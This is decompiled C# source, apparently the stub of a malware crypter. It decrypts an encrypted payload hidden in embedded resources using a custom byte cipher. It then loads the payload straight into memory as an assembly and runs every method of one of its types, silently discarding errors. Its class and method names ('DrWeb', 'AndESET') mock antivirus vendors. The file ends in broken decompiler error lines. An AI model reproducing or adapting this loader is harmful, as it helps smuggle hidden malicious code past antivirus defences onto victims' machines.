using System;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using JEZA_IOJ.My.Resources;
using Microsoft.VisualBasic.CompilerServices;

namespace JEZA_IOJ.Hello;

[StandardModule]
public sealed class DrWeb
{
	private static Assembly chocolate;

	private static object kk = null;

	public static byte[] Decrypt(byte[] input, int key)
	{
		checked
		{
			int num = input.Length - 2;
			int num2;
			for (num2 = 0; num2 <= num; num2 += 2)
			{
				int num3 = input[num2];
				int num4 = input[num2 + 1];
				int i = 2 * num4 - key - num3;
				int j;
				for (j = key - num3 + num4; j < 0; j += 256)
				{
				}
				for (; i < 0; i += 256)
				{
				}
				input[num2] = (byte)unchecked(j % 256);
				num2++;
				input[num2] = (byte)unchecked(i % 256);
				num2--;
			}
			return input;
		}
	}

	public static void AndESET()
	{
		byte[] rawAssembly = Decrypt((byte[])((ResourceManager)Resources.unknown_0).GetObject((string)Resources.unknown_3), Conversions.ToInteger((string)Resources.unknown_2));
		chocolate = AppDomain.CurrentDomain.Load(rawAssembly);
		Type type = chocolate.GetTypes()[5];
		MethodInfo[] methods = type.GetMethods();
		foreach (MethodInfo methodInfo in methods)
		{
			try
			{
				methodInfo.Invoke(RuntimeHelpers.GetObjectValue(kk), new object[0]);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	static Nullable smethod_0()
	{
		/*Error: ldloc 0 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}
}
